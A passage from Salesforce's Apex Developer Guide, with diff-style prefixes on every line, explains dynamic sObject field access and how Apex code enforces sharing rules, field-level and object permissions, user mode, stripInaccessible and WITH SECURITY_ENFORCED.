-   Schema.DescribeFieldResult dfr = Schema.sObjectType.Account.fields.AccountNumber;
-
-   Sobject s = Database.query('SELECT AccountNumber FROM Account LIMIT 1');
-
-   s.put(dfr.getsObjectField(), '12345');
-
-```
-
-The Object scalar data type can be used as a generic data type to set or retrieve field values on an sObject. This is equivalent to the
-[anyType field type. Note that the Object data type is different from the sObject data type, which can be used as a generic type for any](https://developer.salesforce.com/docs/atlas.en-us.260.0.object_reference.meta/object_reference/field_types.htm)
-sObject.
-
-Note: Apex classes and triggers saved (compiled) using API version 15.0 and higher produce a runtime error if you assign a String
-value that is too long for the field.
-
-Setting and Retrieving Foreign Keys
-
-Apex supports populating foreign keys by name (or external ID) in the same way as the API. To set or retrieve the scalar ID value of a
-foreign key, use the `get` or `put` methods.
-
-To set or retrieve the _record_ associated with a foreign key, use the `getSObject` and `putSObject` methods. Note that these
-methods must be used with the sObject data type, not Object. For example:
-
-```
-   SObject c =
-
-     Database.query('SELECT Id, FirstName, AccountId, Account.Name FROM Contact LIMIT 1');
-
-   SObject a = c.getSObject('Account');
-
-```
-
-There is no need to specify the external ID for a parent sObject value while working with child sObjects. If you provide an ID in the parent
-sObject, it is ignored by the DML operation. Apex assumes the foreign key is populated through a relationship SOQL query, which always
-returns a parent object with a populated ID. If you have an ID, use it with the child object.
-
-For example, suppose that custom object C1 has a foreign key `C2__c` that links to a parent custom object C2. You want to create a C1
-object and have it associated with a C2 record named 'AW Computing' (assigned to the value `C2__r` ). You do not need the ID of the
-'AW Computing' record, as it is populated through the relationship of parent to child. For example:
-
-```
-   insert new C1__c(Name = 'x', C2__r = new C2__c(Name = 'AW Computing'));
-
-```
-
-If you had assigned a value to the ID for `C2__r`, it would be ignored. If you do have the ID, assign it to the object ( `C2__c` ), not the
-record.
-
-You can also access foreign keys using dynamic Apex. The following example shows how to get the values from a subquery in a
-parent-to-child relationship using dynamic Apex:
-
-```
-   String queryString = 'SELECT Id, Name, ' +
-
-          '(SELECT FirstName, LastName FROM Contacts LIMIT 1) FROM Account';
-
-   SObject[] queryParentObject = Database.query(queryString);
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-   for (SObject parentRecord : queryParentObject){
-
-      Object ParentFieldValue = parentRecord.get('Name');
-
-      // Prevent a null relationship from being accessed
-
-      SObject[] childRecordsFromParent = parentRecord.getSObjects('Contacts');
-
-      if (childRecordsFromParent != null) {
-
-        for (SObject childRecord : childRecordsFromParent){
-
-           Object ChildFieldValue1 = childRecord.get('FirstName');
-
-           Object ChildFieldValue2 = childRecord.get('LastName');
-
-           System.debug('Account Name: ' + ParentFieldValue +
-
-           '. Contact Name: '+ ChildFieldValue1 + ' ' + ChildFieldValue2);
-
-        }
-
-      }
-
-   }
-
-#### Apex Security and Sharing
-
-```
-
-When you use Apex, the security of your code is critical. You'll need to add user permissions for Apex classes and enforce sharing rules.
-Read on to learn about Apex managed sharing and get some security tips.
-
-Enforce Sharing Rules
-Apex generally runs in system context, so the current user’s permissions and field-level security aren’t taken into account during
-code execution. You can use sharing rules to extend a user’s access to specific records, and then enforce sharing rules by using the
-`with sharing` keyword on a class declaration. If you declare a class with the `without sharing` keyword, then sharing
-rules aren’t enforced.
-
-Enforce Object and Field Permissions
-Apex generally runs in system context, so the current user's permissions and field-level security (FLS) aren’t taken into account during
-code execution. To enforce the FLS and object permissions of the current user, you can enforce user mode for database operations
-and SOQL queries. You can also check the current user's permissions for an object or a field, and then perform a specific DML operation
-or a query only if the user has sufficient permissions.
-
-Enforce User Mode for Database Operations
-You can run database operations in user mode rather than in the default system mode by using SOQL or SOSL queries with special
-keywords or by using DML method overloads.
-
-Enforce Security with the stripInaccessible Method
-Use the `stripInaccessible` method to enforce field-level and object-level data protection. This method can be used to strip
-the fields and relationship fields from query and subquery results that the user can’t access. The method can also be used to remove
-inaccessible sObject fields before DML operations to avoid exceptions and to sanitize sObjects that have been deserialized from an
-untrusted source.
-
-Filter SOQL Queries Using WITH SECURITY_ENFORCED
-Use the `WITH SECURITY_ENFORCED` clause to enable field- and object-level security permissions checking for `SOQL SELECT`
-queries in Apex code, including subqueries and cross-object relationships.
-
-Class Security
-
-Understanding Apex Managed Sharing
-_Sharing_ is the act of granting a user or group of users permission to perform a set of actions on a record or set of records. Sharing
-access can be granted using the Salesforce user interface and Lightning Platform, or programmatically using Apex.
-
-Security Tips for Apex and Visualforce Development
-
-
-Apex Developer Guide Working with Data in Apex
-
-##### Enforce Sharing Rules
-
-Apex generally runs in system context, so the current user’s permissions and field-level security aren’t taken into account during code
-execution. You can use sharing rules to extend a user’s access to specific records, and then enforce sharing rules by using the `with`
-`sharing` keyword on a class declaration. If you declare a class with the `without sharing` keyword, then sharing rules aren’t
-enforced.
-
-Note: Apex code that is executed with the `executeAnonymous` call and Connect in Apex always execute using the sharing
-rules of the current user. See Anonymous Blocks on page 264.
-
-Apex developers must take care not to inadvertently expose sensitive data that would normally be hidden from users by user permissions,
-field-level security, or organization-wide defaults. They must be particularly careful with Web services, which can be restricted by
-permissions, but execute in system context after they’re initiated.
-
-Most of the time, system context provides the correct behavior for system-level operations such as triggers and Web services that need
-access to all data in an organization. However, you can also specify that particular Apex classes should enforce the sharing rules that
-apply to the current user.
-
-Note: Enforcing sharing rules by using the `with sharing` keyword doesn’t enforce the user’s permissions and field-level
-security. Apex always has access to all fields and objects in an organization, ensuring that code won’t fail to run because of fields
-or objects that are hidden from a user.
-
-This example has two classes, the first class ( `CWith` ) enforces sharing rules while the second class ( `CWithout` ) doesn’t. The `CWithout`
-class calls a method from the first, which runs with sharing rules enforced. The `CWithout` class contains an inner class, in which code
-executes under the same sharing context as the caller. It also contains a class that extends it, which inherits its without sharing setting.
-
-```
-   public with sharing class CWith {
-
-     // All code in this class operates with enforced sharing rules.
-
-     Account a = [SELECT . . . ];
-
-     public static void m() { . . . }
-
-     static {
-
-      . . .
-
-     }
-
-     {
-
-      . . .
-
-     }
-
-     public void c() {
-
-      . . .
-
-     }
-
-   }
-
-   public without sharing class CWithout {
-
-     // All code in this class ignores sharing rules and operates
-
-     // as if the context user has the Modify All Data permission.
-
-     Account a = [SELECT . . . ];
-
-     . . .
-
-     public static void m() {
-
-      . . .
-
-      // This call into CWith operates with enforced sharing rules
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-      // for the context user. When the call finishes, the code execution
-
-      // returns to without sharing mode.
-
-      CWith.m();
-
-     }
-
-     public class CInner {
-
-      // All code in this class executes with the same sharing context
-
-      // as the code that calls it.
-
-      // Inner classes are separate from outer classes.
-
-      . . .
-
-      // Again, this call into CWith operates with enforced sharing rules
-
-      // for the context user, regardless of the class that initially called this inner
-
-   class.
-
-      // When the call finishes, the code execution returns to the sharing mode that was
-
-   used to call this inner class.
-
-      CWith.m();
-
-     }
-
-     public class CInnerWithOut extends CWithout {
-
-      // All code in this class ignores sharing rules because
-
-      // this class extends a parent class that ignores sharing rules.
-
-     }
-
-   }
-
-```
-
-Warning: Because a class declared as `with sharing` can call a class declared as `without sharing`, you may still have
-to implement class-level security. In addition, all SOQL and SOSL queries that use Pricebook2 ignore the `with sharing`
-keyword. All price books are returned, regardless of the applied sharing rules.
-
-Enforcing the current user's sharing rules can impact:
-
-**•** SOQL and SOSL queries. A query can return fewer rows than it would operating in system context.
-
-**•** DML operations. An operation can fail because the current user doesn't have the correct permissions. For example, if the user specifies
-a foreign key value that exists in the organization, but which the current user doesn’t have access to, then the DML operation fails.
-
-SEE ALSO:
-
-Use the with sharing, without sharing, and inherited sharing Keywords
-
-_Salesforce Help_ [: Sharing Rules](https://help.salesforce.com/s/articleView?id=platform.security_about_sharing_rules.htm&type=5&language=en_US)
-
-##### Enforce Object and Field Permissions
-
-Apex generally runs in system context, so the current user's permissions and field-level security (FLS) aren’t taken into account during
-code execution. To enforce the FLS and object permissions of the current user, you can enforce user mode for database operations and
-SOQL queries. You can also check the current user's permissions for an object or a field, and then perform a specific DML operation or
-a query only if the user has sufficient permissions.
-
-Enforce User Mode
-
-To enforce field-level security and object permissions of the current user, you can specify user mode access for database operations and
-[SOQL queries. See Enforce User Mode for Database Operations.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/apex_classes_enforce_usermode.htm)
-
-
-Apex Developer Guide Working with Data in Apex
-
-Check Field-Level Permissions
-
-You can also enforce object-level and field-level permissions in your code by explicitly calling the access control methods of the
-[Schema.DescribeSObjectResult and the Schema.DescribeFieldResult classes. These methods check the current user's access permission](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)
-levels so that you can perform a specific DML operation or a query only if the user has sufficient permissions.
-
-For example, you can call the `isAccessible`, `isCreateable`, or `isUpdateable` methods of
-`Schema.DescribeSObjectResult` to verify whether the current user has read, create, or update access to an sObject, respectively.
-Similarly, `Schema.DescribeFieldResult` exposes these access control methods that you can call to check the current user's
-read, create, or update access for a field. In addition, you can call the `isDeletable` method provided by
-`Schema.DescribeSObjectResult` to check if the current user has permission to delete a specific sObject.
-
-These examples call the access control methods.
-
-To check the field-level update permission of the contact's email field before updating it:
-
-```
-   if (Schema.sObjectType.Contact.fields.Email.isUpdateable()) {
-
-      // Update contact
-
-   }
-
-```
-
-To check the field-level create permission of the contact's email field before creating a new contact:
-
-```
-   if (Schema.sObjectType.Contact.fields.Email.isCreateable()) {
-
-      // Create new contact
-
-   }
-
-```
-
-To check the field-level read permission of the contact's email field before querying for this field:
-
-```
-   if (Schema.sObjectType.Contact.fields.Email.isAccessible()) {
-
-      Contact c = [SELECT Email FROM Contact WHERE Id= :Id];
-
-   }
-
-```
-
-To check the object-level permission for the contact before deleting the contact:
-
-```
-   if (Schema.sObjectType.Contact.isDeletable()) {
-
-      // Delete contact
-
-   }
-
-```
-
-Considerations
-
-**•** Object-level and field-level permissions are distinct from sharing rules, which enforce specific record access. They can coexist. If
-sharing rules are defined in Salesforce, you can enforce them at the class level by declaring the class with the `with sharing`
-[keyword. See Use the with sharing, without sharing, and inherited sharing Keywords. If you call the Schema.DescribeSObjectResult](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)
-[and Schema.DescribeFieldResult access control methods, the verification of object and field-level permissions is performed in addition](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_fields_describe.htm)
-to the sharing rules that are in effect. Sometimes, the access level granted by a sharing rule can conflict with an object-level or
-field-level permission. In that case, object-level and field-level permissions take precedence over sharing rules.
-
-**•** [Orgs with Experience Cloud sites enabled provide various settings to hide a user's personal information from other users. See Manage](https://help.salesforce.com/s/articleView?id=platform.users_manage_personal_info_visibility.htm&type=5&language=en_US)
-[Personal User Information Visibility and Share Personal Contact Information Within Experience Cloud Sites. These settings aren’t](https://help.salesforce.com/s/articleView?id=platform.users_manage_personal_info_visibility.htm&type=5&language=en_US)
-enforced in Apex, even with security features such as the `WITH USER_MODE` clause or the `stripInaccessible` method.
-[To hide specific fields on the User object in Apex, follow the example code outlined in Comply with a User’s Personal Information](https://developer.salesforce.com/docs/atlas.en-us.260.0.communities_dev.meta/communities_dev/communities_dev_pii_settings.htm)
-[Visibility Settings.](https://developer.salesforce.com/docs/atlas.en-us.260.0.communities_dev.meta/communities_dev/communities_dev_pii_settings.htm)
-
-
-Apex Developer Guide Working with Data in Apex
-
-**•** Automated Process users can’t perform Object and FLS checks in custom code unless appropriate permission sets are explicitly
-applied to those users.
-
-SEE ALSO:
-
-_Salesforce Help_ [: Set Up Your Users’ Object, User, and Field Permissions](https://help.salesforce.com/s/articleView?id=platform.security_data_access_mgmt.htm&type=5&language=en_US)
-
-##### Enforce User Mode for Database Operations
-
-You can run database operations in user mode rather than in the default system mode by using SOQL or SOSL queries with special
-keywords or by using DML method overloads.
-
-Apex code runs in system mode by default, which means that it runs with substantially elevated permissions over the user running the
-code. To enhance the security context of Apex, you can specify user-mode access for database operations. Field-level security (FLS) and
-object permissions of the running user are respected in user mode, unlike in system mode. User mode always applies sharing rules, but
-in system mode they’re controlled by sharing keywords on the class. See Use the with sharing, without sharing, and inherited sharing
-Keywords.
-
-You can indicate the mode of the operation by using `WITH USER_MODE` or `WITH SYSTEM_MODE` in your SOQL or SOSL query.
-This example specifies user mode in SOQL.
-
-```
-   List<Account> acc = [SELECT Id FROM Account WITH USER_MODE];
-
-```
-
-Salesforce recommends that you enforce Field Level Security (FLS) by using `WITH USER_MODE` rather than `WITH`
-`SECURITY_ENFORCED` because of these additional advantages.
-
-**•** `WITH USER_MODE` accounts for polymorphic fields like `Owner` and `Task.whatId` .
-
-**•** `WITH USER_MODE` processes all clauses in the SOQL `SELECT` statement including the `WHERE` clause.
-
-**•** `WITH USER_MODE` finds all FLS errors in your SOQL query, while `WITH SECURITY_ENFORCED` finds only the first error.
-Further, in user mode, you can use the `getInaccessibleFields()` method on QueryException to examine the full set of
-access errors.
-
-Note: Avoid specifying access modes, either with special keywords or the `AccessLevel` class, in the same query as a `WITH`
-`SECURITY_ENFORCED` clause. Salesforce recommends that you specify either system mode or user mode, and remove any
-redundant `WITH SECURITY_ENFORCED` clauses.
-
-Database operations can specify either user or system mode. This example inserts a new account in user mode.
-
-```
-   Account acc = new Account(Name='test');
-
-   insert as user acc;
-
-```
-
-The `AccessLevel` class represents the two modes in which Apex runs database operations. Use this class to define the execution
-mode as user mode or system mode. An optional _`accessLevel`_ parameter in Database and Search methods specifies whether the
-method runs in system mode ( `AccessLevel.SYSTEM_MODE` ) or user mode ( `AccessLevel.USER_MODE` ).
-
-Use these overloaded methods to perform DML and query operations.
-
-**•** `[Database.query](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_query_2)` method. See Dynamic SOQL.
-
-**•** `[Database.getQueryLocator](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_getQueryLocator_3)` methods
-
-**•** `[Database.countQuery](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_countQuery_2)` method
-
-**•** `[Search.query](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_search.htm#apex_System_Search_query_2)` method
-
-**•** [Database DML methods (](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_database.htm) `insert`, `update`, `upsert`, `merge`, `delete`, `undelete`, and `convertLead` ). Includes the
-`*Immediate` and `*Async` methods, such as `insertImmediate` and `deleteAsync` .
-
-
-Apex Developer Guide Working with Data in Apex
-
-Note: When Database DML methods are run with `AccessLevel.USER_MODE`, you can access errors via
-`SaveResult.getErrors().getFields()` . With `insert as user`, you can use the `DMLException` method
-`getDmlFieldNames()` to obtain the fields with FLS errors.
-
-These methods require the _`accessLevel`_ parameter.
-
-**•** `[Database.queryWithBinds](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_queryWithBinds)`
-
-**•** `[Database.getQueryLocatorWithBinds](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_getQueryLocatorWithBinds)`
-
-**•** `[Database.countQueryWithBinds](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_countQueryWithBinds)`
-
-Example: This example assumes that the context user does not have view and edit permissions on `Account.AnnualRevenue` .
-An exception is thrown on the insert operation and the inaccessible fields are retrieved using `getDmlFieldNames()` .
-
-```
-      try {
-
-      List<Account> accts = new Account[] {new Account(name ='foo', AnnualRevenue=2000)};
-
-      Database.insert(accts, AccessLevel.USER_MODE); // throws an exception
-
-      Assert.fail('DmlException expected');
-
-      } catch (DmlException dex) {
-
-        Assert.isTrue(dex.getMessage()
-
-         .contains(
-
-         'Operation failed due to fields being inaccessible on Sobject <object name>,
-
-      check errors on Exception or Result!'
-
-         )
-
-        );
-
-        Assert.isTrue(dex.getDmlFieldNames(0).contains('AnnualRevenue'));
-
-      }
-
-```
-
-Using Permission Sets to Enforce Security in DML and Search Operations (Developer Preview)
-
-In Developer Preview, you can specify a permission set that is used to augment the field-level and object-level security for database and
-search operations. Run the `AccessLevel.withPermissionSetId()` method with a specified permission set ID. Specific user
-mode DML operations that are performed with that `AccessLevel`, respect the permissions in the specified permission set, in addition
-to the running user’s permissions.
-
-This example runs the `AccessLevel.withPermissionSetId()` method with the specified permission set and inserts a
-custom object.
-
-```
-   @isTest
-
-   public with sharing class ElevateUserModeOperations_Test {
-
-      @isTest
-
-      static void objectCreatePermViaPermissionSet() {
-
-        Profile p = [SELECT Id FROM Profile WHERE Name='Minimum Access - Salesforce'];
-
-        User u = new User(Alias = 'standt', Email='standarduser@testorg.com',
-
-           EmailEncodingKey='UTF-8', LastName='Testing', LanguageLocaleKey='en_US',
-
-           LocaleSidKey='en_US', ProfileId = p.Id,
-
-           TimeZoneSidKey='America/Los_Angeles',
-
-           UserName='standarduser' + DateTime.now().getTime() + '@testorg.com');
-
-        System.runAs(u) {
-
-           try {
-
-             Database.insert(new Account(name='foo'), AccessLevel.User_mode);
-
-             Assert.fail();
-
-           } catch (SecurityException ex) {
-
-             Assert.isTrue(ex.getMessage().contains('Account'));
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-           }
-
-           //Get ID of previously created permission set named 'AllowCreateToAccount'
-
-           Id permissionSetId = [Select Id from PermissionSet
-
-             where Name = 'AllowCreateToAccount' limit 1].Id;
-
-           Database.insert(new Account(name='foo'),
-
-   AccessLevel.User_mode.withPermissionSetId(permissionSetId));
-
-           // The elevated access level is not persisted to subsequent operations
-
-           try {
-
-             Database.insert(new Account(name='foo2'), AccessLevel.User_mode);
-
-             Assert.fail();
-
-           } catch (SecurityException ex) {
-
-             Assert.isTrue(ex.getMessage().contains('Account'));
-
-           }
-
-        }
-
-      }
-
-   }
-
-```
-
-[Note: Checkmarx, the AppExchange Security Review source code scanner, hasn’t been updated with this new Apex feature. Until](https://developer.salesforce.com/docs/atlas.en-us.260.0.packagingGuide.meta/packagingGuide/security_review_partner_security_portal_scanners.htm)
-it’s updated, Checkmarx can generate false positives for field or object level security violations that require exception documentation.
-
-##### Enforce Security with the stripInaccessible Method
-
-Use the `stripInaccessible` method to enforce field-level and object-level data protection. This method can be used to strip
-the fields and relationship fields from query and subquery results that the user can’t access. The method can also be used to remove
-inaccessible sObject fields before DML operations to avoid exceptions and to sanitize sObjects that have been deserialized from an
-untrusted source.
-
-Important: Where possible, we changed noninclusive terms to align with our company value of Equality. We maintained certain
-terms to avoid any effect on customer implementations.
-
-[The field- and object-level data protection is accessed through the Security and SObjectAccessDecision classes. The access check is](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_class_System_Security.htm)
-based on the field-level permission of the current user in the context of the specified operation—create, read, update, or upsert. The
-[Security.stripInaccessible() method checks the source records for fields that don’t meet the field-level security check for the current user.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_class_System_Security.htm)
-The method also checks the source records for lookup or master-detail relationship fields to which the current user doesn’t have access.
-The method creates a return list of sObjects that is identical to the source records, except that the fields that are inaccessible to the
-current user are removed. The sObjects returned by the `getRecords` method contain records in the same order as the sObjects in
-the `sourceRecords` parameter of the `stripInaccessible` method.
-
-The `Security.stripInaccessible()` method takes a permission set ID as a parameter and enforces field-level and object-level
-access as per the specified permission set, in addition to the running user’s permissions.
-
-Note: The ID field is never stripped by the `stripInaccessible` method to avoid issues when performing DML on the
-result.
-
-[To identify inaccessible fields that were removed, you can use the SObject.isSet() method. For example, the return list contains the](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_sobject.htm#apex_System_SObject_isSet)
-Contact object and the custom field social_security_number__c is inaccessible to the user. Because this custom field fails the field-level
-access check, the field isn’t set and `isSet` returns `false` .
-
-```
-   SObjectAccessDecision securityDecision = Security.stripInaccessible(AccessType.READABLE,
-
-   sourceRecords);
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-   Contact c = securityDecision.getRecords()[0];
-
-   System.debug(c.isSet('social_security_number__c')); // prints "false"
-
-```
-
-Note: The `stripInaccessible` method doesn’t support AggregateResult SObject. If the source records are of AggregateResult
-SObject type, an exception is thrown.
-
-To enforce object and field permissions on the User object and hide a user’s personal information from other users in orgs with Experience
-[Cloud sites, see Enforcing Object and Field Permissions.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/apex_classes_perms_enforcing.htm)
-
-The following are some examples where the `stripInaccessible` method can be used.
-
-Example: This example code removes inaccessible fields from the query result. A display table for campaign data must always
-show the `BudgetedCost` . The `ActualCost` must be shown only to users who have permission to read that field.
-
-```
-      SObjectAccessDecision securityDecision =
-
-           Security.stripInaccessible(AccessType.READABLE,
-
-                [SELECT Name, BudgetedCost, ActualCost FROM Campaign]
-
-       );
-
-        // Construct the output table
-
-        if (securityDecision.getRemovedFields().get('Campaign').contains('ActualCost')) {
-
-           for (Campaign c : securityDecision.getRecords()) {
-
-           //System.debug Output: Name, BudgetedCost
-
-           }
-
-        } else {
-
-           for (Campaign c : securityDecision.getRecords()) {
-
-           //System.debug Output: Name, BudgetedCost, ActualCost
-
-           }
-
-      }
-
-```
-
-Example: This example code removes inaccessible fields from the subquery result. The user doesn’t have permission to read the
-`Phone` field of a Contacts object.
-
-```
-      List<Account> accountsWithContacts =
-
-      [SELECT Id, Name, Phone,
-
-         (SELECT Id, LastName, Phone FROM Account.Contacts)
-
-      FROM Account];
-
-        // Strip fields that are not readable
-
-        SObjectAccessDecision decision = Security.stripInaccessible(
-
-                           AccessType.READABLE,
-
-                           accountsWithContacts);
-
-      // Print stripped records
-
-        for (Integer i = 0; i < accountsWithContacts.size(); i++)
-
-       {
-
-         System.debug('Insecure record access: '+accountsWithContacts[i]);
-
-         System.debug('Secure record access: '+decision.getRecords()[i]);
-
-        }
-
-      // Print modified indexes
-
-       System.debug('Records modified by stripInaccessible: '+decision.getModifiedIndexes());
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-      // Print removed fields
-
-        System.debug('Fields removed by stripInaccessible: '+decision.getRemovedFields());
-
-```
-
-Example: This example code removes inaccessible fields from sObjects before DML operations. The user who doesn’t have
-permission to create Rating for an Account can still create an Account. The method ensures that no Rating is set and doesn’t throw
-an exception.
-
-```
-      List<Account> newAccounts = new List<Account>();
-
-      Account a = new Account(Name='Acme Corporation');
-
-      Account b = new Account(Name='Blaze Comics', Rating=’Warm’);
-
-      newAccounts.add(a);
-
-      newAccounts.add(b);
-
-      SObjectAccessDecision securityDecision = Security.stripInaccessible(
-
-                              AccessType.CREATABLE, newAccounts);
-
-      // No exceptions are thrown and no rating is set
-
-      insert securityDecision.getRecords();
-
-      System.debug(securityDecision.getRemovedFields().get('Account')); // Prints "Rating"
-
-      System.debug(securityDecision.getModifiedIndexes()); // Prints "1"
-
-```
-
-Example: This example code sanitizes sObjects that have been deserialized from an untrusted source. The user doesn’t have
-permission to update the `AnnualRevenue` of an Account.
-
-```
-      String jsonInput =
-
-      '[' +
-
-      '{' +
-
-      '"Name": "InGen",' +
-
-      '"AnnualRevenue": "100"' +
-
-      '},' +
-
-      '{' +
-
-      '"Name": "Octan"' +
-
-      '}' +
-
-      ']';
-
-      List<Account> accounts = (List<Account>)JSON.deserializeStrict(jsonInput,
-
-      List<Account>.class);
-
-      SObjectAccessDecision securityDecision = Security.stripInaccessible(
-
-                              AccessType.UPDATABLE, accounts);
-
-      // Secure update
-
-      update securityDecision.getRecords(); // Doesn’t update AnnualRevenue field
-
-      System.debug(String.join(securityDecision.getRemovedFields().get('Account'), ', '));
-
-      // Prints "AnnualRevenue"
-
-      System.debug(String.join(securityDecision.getModifiedIndexes(), ', ')); // Prints "0”
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-Example: This example code removes inaccessible relationship fields from the query result. The user doesn’t have permission to
-insert the `Account__c` field, which is a lookup from MyCustomObject__c to Account.
-
-```
-      // Account__c is a lookup from MyCustomObject__c to Account
-
-      @IsTest
-
-        public class TestCustomObjectLookupStripped {
-
-         @IsTest static void caseCustomObjectStripped() {
-
-           Account a = new Account(Name='foo');
-
-           insert a;
-
-           List<MyCustomObject__c> records = new List<MyCustomObject__c>{
-
-             new MyCustomObject__c(Name='Custom0', Account__c=a.id)
-
-           };
-
-           insert records;
-
-           records = [SELECT Id, Account__c FROM MyCustomObject__c];
-
-           SObjectAccessDecision securityDecision = Security.stripInaccessible
-
-                                    (AccessType.READABLE, records);
-
-           // Verify stripped records
-
-           System.assertEquals(1, securityDecision.getRecords().size());
-
-           for (SObject strippedRecord : securityDecision.getRecords()) {
-
-              System.debug('Id should be set as Id fields are ignored: ' +
-
-                      strippedRecord.isSet('Id')); // prints true
-
-              System.debug('Lookup field FLS is not READABLE to running user,
-
-                      should not be set: ' +
-
-                      strippedRecord.isSet('Account__c')); // prints false
-
-           }
-
-         }
-
-        }
-
-```
-
-SEE ALSO:
-
-_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_enum_System_AccessType.htm)_ : AccessType Enum
-
-_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_class_System_Security.htm)_ : Security Class
-
-_Apex Reference Guide_ [: SObjectAccessDecision Class](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_class_System_SObjectAccessDecision.htm)
-
-##### Filter SOQL Queries Using WITH SECURITY_ENFORCED
-
-Use the `WITH SECURITY_ENFORCED` clause to enable field- and object-level security permissions checking for `SOQL SELECT`
-queries in Apex code, including subqueries and cross-object relationships.
-
-Important: Salesforce recommends that you enforce Field Level Security (FLS) by using `WITH USER_MODE` instead of `WITH`
-`SECURITY_ENFORCED` because it has fewer limitations.
-
-If you enforce user mode, remove any redundant `WITH SECURITY_ENFORCED` clauses. You can’t combine both forms of
-access checks in the same query.
-
-See Enforce User Mode for Database Operations on page 216.
-
-Apex generally runs in system context; that is, the current user's permissions and field-level security aren’t taken into account during
-code execution. Sharing rules, however, are not always bypassed: the class must be declared with the `without sharing` keyword
-in order to ensure that sharing rules are not enforced. Although performing field- and object-level security checks was possible in earlier
-releases, this clause substantially reduces the verbosity and technical complexity in query operations. This feature is tailored to Apex
-
-
-Apex Developer Guide Working with Data in Apex
-
-developers who have minimal development experience with security and to applications where graceful degradation on permissions
-errors isn’t required.
-
-Note: The `WITH SECURITY_ENFORCED` clause is only available in Apex. We don’t recommend using `WITH`
-`SECURITY_ENFORCED` in Apex classes or triggers with an API version earlier than 45.0.
-
-`WITH SECURITY_ENFORCED` applies field- and object-level security checks only to fields and objects referenced in `SELECT` or
-`FROM` SOQL clauses and not clauses like `WHERE` or `ORDER BY` . In other words, security is enforced on what the `SOQL SELECT`
-query returns, not on all the elements that go into running the query.
-
-Insert the `WITH SECURITY_ENFORCED` clause:
-
-**•** After the `WHERE` clause if one exists, else after the `FROM` clause.
-
-**•** Before any `ORDER BY`, `LIMIT`, `OFFSET`, or aggregate function clauses.
-
-For more information on `SOQL SELECT` [queries, see SOQL SELECT Syntax in the SOQL and SOSL Reference.](https://developer.salesforce.com/docs/atlas.en-us.260.0.soql_sosl.meta/soql_sosl/sforce_api_calls_soql_select.htm)
-
-For example, if the user has field access for LastName, this query returns Id and LastName for the Acme account entry.
-
-```
-   List<Account> act1 = [SELECT Id, (SELECT LastName FROM Contacts)
-
-     FROM Account WHERE Name like 'Acme' WITH SECURITY_ENFORCED]
-
-```
-
-There are some restrictions while querying polymorphic lookup fields using `WITH SECURITY_ENFORCED` . Polymorphic fields are
-relationship fields that can point to more than one entity.
-
-**•** Traversing a polymorphic field’s relationship is not supported in queries using `WITH SECURITY_ENFORCED` . For example, you
-cannot use `WITH SECURITY_ENFORCED` in this query, which returns the Id and Owner names for User and Calendar entities:
-`SELECT Id, What.Name FROM Event WHERE What.Type IN (’User’,’Calendar’)` .
-
-**•** Using `TYPEOF` expressions with an `ELSE` clause is not supported in queries using `WITH SECURITY_ENFORCED` . `TYPEOF`
-is used in a SELECT query to specify the fields to be returned for a given type of a polymorphic relationship. For example, you cannot
-use `WITH SECURITY_ENFORCED` in this query. The query specifies certain fields to be returned for Account and Opportunity
-objects, and Name and Email fields to be returned for all other objects.
-
-```
-     SELECT
-
-     TYPE OF What
-
-       WHEN Account THEN Phone
-
-       WHEN Opportunity THEN Amount
-
-       ELSE Name,Email
-
-     END
-
-     FROM Event
-
-```
-
-**•** The `Owner`, `CreatedBy`, and `LastModifiedBy` polymorphic lookup fields are exempt from this restriction, and do allow
-polymorphic relationship traversal.
-
-**•** For AppExchange Security Review, you must use API version 48.0 or later when using `WITH SECURITY_ENFORCED` . You cannot
-use API versions where the feature was in beta or pilot.
-
-If any fields or objects referenced in the `SOQL SELECT` query using `WITH SECURITY_ENFORCED` are inaccessible to the user,
-a `System.QueryException` is thrown, and no data is returned.
-
-To enforce object and field permissions on the User object and hide a user’s personal information from other users in orgs with Experience
-[Cloud sites, see Enforcing Object and Field Permissions.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/apex_classes_perms_enforcing.htm)
-
-
-Apex Developer Guide Working with Data in Apex
-
-Example: If field access for either LastName or Description is hidden, this query throws an exception indicating insufficient
-permissions.
-
-```
-      List<Account> act1 = [SELECT Id, (SELECT LastName FROM Contacts),
-
-        (SELECT Description FROM Opportunities)
-
-        FROM Account WITH SECURITY_ENFORCED]
-
-```
-
